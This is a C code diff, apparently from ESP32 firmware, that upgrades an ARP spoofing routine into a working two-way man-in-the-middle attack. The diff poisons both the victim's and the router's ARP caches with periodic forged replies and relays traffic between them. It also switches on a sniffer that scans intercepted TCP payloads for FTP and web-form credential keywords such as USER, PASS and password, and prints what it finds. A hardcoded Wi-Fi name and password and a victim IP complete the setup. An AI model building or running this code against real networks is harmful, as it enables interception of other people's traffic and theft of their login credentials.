@@ -51,7 +51,7 @@ esp_err_t connect_to_ap(char* ssid, char* password){
 }
 
 /* ARP Spoofing*/
-void send_arp(struct netif *netif, int type) {
+void send_arp(struct netif *netif, int type, int target) { // target 0:victim, 1:router
     struct pbuf *p;
     struct etharp_hdr *arp_reply;
     p = pbuf_alloc(PBUF_RAW, sizeof(struct etharp_hdr) + SIZEOF_ETH_HDR, PBUF_RAM);
@@ -62,12 +62,20 @@ void send_arp(struct netif *netif, int type) {
     struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
     arp_reply = (struct etharp_hdr *)(ethhdr + 1);
     const uint8_t *esp_mac = netif->hwaddr;
-    uint8_t esp_ip[4];
-    memcpy(esp_ip, ip_to_spoof, sizeof(ip_to_spoof));
+   /* uint8_t esp_ip[4];
+    if (target == 0)
+        memcpy(esp_ip, ip_to_spoof, sizeof(ip_to_spoof));
+    else if (target == 1)
+        memcpy(esp_ip, target_ip, sizeof(target_ip));*/
 
     // Ethernet header
-    MEMCPY(ethhdr->dest.addr, target_mac, ETH_HWADDR_LEN); 
+    if (target == 0){
+        MEMCPY(ethhdr->dest.addr, target_mac, ETH_HWADDR_LEN); 
+    } else if (target == 1){
+        MEMCPY(ethhdr->dest.addr, mac_to_spoof, ETH_HWADDR_LEN); 
+    }
     MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
+    
     ethhdr->type = PP_HTONS(ETHTYPE_ARP);
 
     // ARP message
@@ -83,11 +91,21 @@ void send_arp(struct netif *netif, int type) {
     
     // MAC
     MEMCPY(arp_reply->shwaddr.addr, esp_mac, ETH_HWADDR_LEN); //MAC ESP
-    MEMCPY(arp_reply->dhwaddr.addr, target_mac, ETH_HWADDR_LEN); //MAC victim
-    
+    if (target == 0)
+        MEMCPY(arp_reply->dhwaddr.addr, target_mac, ETH_HWADDR_LEN); //MAC victim
+    else if (target == 1)
+        MEMCPY(arp_reply->dhwaddr.addr, mac_to_spoof, ETH_HWADDR_LEN); //MAC router
+
     // IP
-    MEMCPY(&arp_reply->sipaddr, esp_ip, sizeof(ip4_addr_t)); //Source: spoofed ip
-    MEMCPY(&arp_reply->dipaddr, target_ip, sizeof(ip4_addr_t)); //Dest: IP victim
+    if (target == 0){
+        MEMCPY(&arp_reply->sipaddr, ip_to_spoof, sizeof(ip4_addr_t)); //Source: spoofed ip
+        MEMCPY(&arp_reply->dipaddr, target_ip, sizeof(ip4_addr_t)); //Dest: IP victim
+    } else if (target == 1){
+        /* Impersonating victim to router */
+        MEMCPY(&arp_reply->sipaddr, target_ip, sizeof(ip4_addr_t)); //Source: Victim spoofed
+        MEMCPY(&arp_reply->dipaddr, ip_to_spoof, sizeof(ip4_addr_t)); //Dest: router
+    }
+    
 
     // Send ARP
     err_t err = netif->linkoutput(netif, p);
@@ -97,13 +115,52 @@ void send_arp(struct netif *netif, int type) {
 
     pbuf_free(p);
 }
+/* Key words for FTP or web forms*/
+char * key_words [] = {"USER", "PASS", "username", "password", "220"};
+void filter_info(char* payload){
+    for (int i = 0; i < sizeof(key_words)/sizeof(char*); i++){
+        char* p = strstr(payload, key_words[i]);
+        if (p)
+            printf("%32s\n", p);
+    }
+}
+void extract_info(struct pbuf *p){
+    struct eth_hdr *ethhdr;
+    struct ip_hdr *iphdr;
+    struct tcp_hdr *tcphdr;
+    struct udp_hdr *udphdr;
+    void *payload;
+    
+    ethhdr = (struct eth_hdr *)p->payload; // Obtener cabecera Ethernet
+
+    if (htons(ethhdr->type) == ETHTYPE_IP) { // IP
+        iphdr = (struct ip_hdr *)((uint8_t *)p->payload + SIZEOF_ETH_HDR); // Remove ethernet header
+        if (IPH_PROTO(iphdr) ==  IP_PROTO_TCP) { // TCP
+            tcphdr = (struct tcp_hdr *)((uint8_t *)iphdr + (IPH_HL(iphdr) * 4)); //Remove TCP header
+            uint16_t ip_total_len = lwip_ntohs(iphdr->_len); 
+            uint8_t ip_header_len = IPH_HL(iphdr) * 4;
+            uint8_t tcp_header_len = TCPH_HDRLEN(tcphdr) * 4;
+            uint16_t payload_len = ip_total_len - ip_header_len - tcp_header_len;
+
+            payload = (uint8_t *)tcphdr + (TCPH_HDRLEN(tcphdr) * 4);
+            filter_info((char*)payload);
+        }
+    }
+}
+
 void route_packet(struct pbuf *p, struct netif *netif){
     struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
     const uint8_t *esp_mac = netif->hwaddr;
-    // Change source and destination
-    MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
-    MEMCPY(ethhdr->dest.addr, mac_to_spoof, ETH_HWADDR_LEN);
-    // Send
+    if (memcmp(ethhdr->src.addr, target_mac, 6) == 0){// From victim
+        //printf("Victim -> router\n");
+        MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
+        MEMCPY(ethhdr->dest.addr, mac_to_spoof, ETH_HWADDR_LEN);
+    }
+    if (memcmp(ethhdr->src.addr, mac_to_spoof, 6) == 0){// From router
+        //printf("Router -> victim\n");
+        MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
+        MEMCPY(ethhdr->dest.addr, target_mac, ETH_HWADDR_LEN);
+    }
     err_t err = netif->linkoutput(netif, p);
     if (err != ERR_OK) {
         ESP_LOGE(TAG, "Error routing: %d", err);
@@ -132,18 +189,20 @@ err_t my_ethernet_input(struct pbuf *p, struct netif *netif) { // Para tratar pa
                 //printf("Mactospoof: %x:%x:%x:%x:%x:%x", mac_to_spoof[0], mac_to_spoof[1], mac_to_spoof[2], mac_to_spoof[3], mac_to_spoof[4], mac_to_spoof[5]);
             }
             if (memcmp(arphdr->shwaddr.addr, target_mac, 6) == 0){//(arphdr->shwaddr.addr[0] == target_mac[0]){ // Si proviene de la victima
-                ESP_LOGI(TAG, "SENT ARP REPLY");
-                send_arp(netif, 0);
+                ESP_LOGI(TAG, "SENT ARP REPLY TO VICTIM");
+                send_arp(netif, 0, 0); // Reply to victim, compete with the router
             }
             if (memcmp(arphdr->shwaddr.addr, mac_to_spoof, 6) == 0){//(arphdr->shwaddr.addr[0] == mac_to_spoof[0]){ // Si proviene del AP enviamos request
-                ESP_LOGI(TAG, "SENT ARP REQUEST");
-                send_arp(netif, 1);
+                ESP_LOGI(TAG, "SENT ARP REQUEST TO VICTIM");
+                send_arp(netif, 1, 0); //Request a la vicima, compete with the router
+                ESP_LOGI(TAG, "SENT ARP REPLY TO ROUTER");
+                send_arp(netif, 0, 1); // Reply al router, compete with the victim
             }
         }
     }
     else if (ethhdr->type == PP_HTONS(ETHTYPE_IP)) {
         struct ip_hdr *iphdr = (struct ip_hdr *)(p->payload + SIZEOF_ETH_HDR);
-        //extract_info(p);
+        extract_info(p);
         route_packet(p, netif);
     }
     return netif_input(p, netif); // Leave packet to lwIP
@@ -179,17 +238,19 @@ void arp_spoof(char* target, char* to_spoof, char* target_mac_string){
     parse_ip(to_spoof, ip_to_spoof);
     //printf("%u.%u.%u.%u\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
     //printf("%u.%u.%u.%u\n", ip_to_spoof[0], ip_to_spoof[1], ip_to_spoof[2], ip_to_spoof[3]);
-    uint8_t tmp_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //Change accordingly
+    uint8_t tmp_mac[6] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA}; //Change accordingly 
     memcpy(mac_to_spoof, tmp_mac, 6);
     parse_mac(target_mac_string, target_mac);
     /*printf("MAC correctly parsed: %02x:%02x:%02x:%02x:%02x:%02x\n",
                 target_mac[0], target_mac[1], target_mac[2],
                 target_mac[3], target_mac[4], target_mac[5]);*/
-    send_arp(netif, 0);
+    send_arp(netif, 0, 0); // Reply to Victim
+    send_arp(netif, 0, 1); // Reply to router
     running = true;
     while (running){
-        send_arp(netif, 1);
-        ESP_LOGI(TAG, "Sent request");
+        send_arp(netif, 1, 0);
+        send_arp(netif, 1, 1);
+        ESP_LOGI(TAG, "Sent periodic request");
         DELAY(5000);
     }
     // Restore state
@@ -210,8 +271,8 @@ void app_main(void)
     wifi_init();
     wifi_init_sta();
     start_wifi();
-    connect_to_ap("", "");
+    connect_to_ap("mi_AP", "miappass");
     DELAY(2000);
     // Change accordingly
-    arp_spoof("192.168.x.x", "192.168.1.1", "xx:xx:xx:xx:xx:xx");
+    arp_spoof("192.168.1.132", "192.168.1.1", "XX:XX:XX:XX:XX:XX");
 }
